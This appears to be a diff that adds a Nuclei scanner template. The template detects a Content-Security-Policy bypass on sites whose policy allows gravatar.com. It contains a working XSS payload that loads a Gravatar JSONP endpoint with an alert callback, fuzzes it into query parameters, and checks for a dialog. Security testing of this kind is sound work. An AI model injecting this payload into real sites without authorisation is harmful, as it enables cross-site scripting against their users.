@@ -1,0 +1,55 @@
+id: gravatar-secure-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Gravatar Secure
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,gravatar-secure
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "gravatar.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: gravatar_secure_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://secure.gravatar.com/930fc2e7cd239606c398bff5b5fc12e7.json?callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "gravatar_secure_csp_xss == true"
+# digest: 490a00463044022034251284cbd1a780489a567b285f73e23e86b05295000bfe45a792fbf543edad022006119fc1a8f559053f3798849a8eb4e5595466e05775b3d63ba652d529a1fc93:922c64590222798bb761d5b6d8e72950
